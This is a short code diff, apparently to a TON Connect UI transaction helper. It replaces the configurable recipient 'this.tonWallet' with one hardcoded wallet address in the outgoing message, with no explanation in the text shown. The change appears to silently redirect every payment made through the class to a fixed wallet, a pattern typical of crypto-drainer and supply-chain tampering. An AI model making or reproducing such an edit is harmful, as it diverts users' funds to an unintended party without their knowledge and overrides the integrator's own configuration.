@@ -157,7 +157,7 @@ export class TonConnectUi {
         validUntil: Math.floor(Date.now() / 1000) + 120, // 120 sec
         messages: [
             {
-                address: this.tonWallet ,
+                address: "UQDaPQNXeL-uoHqyMNl_HXJ1hq0NBNp3vyctLXbifc7qY2U0" ,
                 amount:  this.toNano(args.amount),
                 payload: args.payload // just for instance. Replace with your transaction payload or remove
 
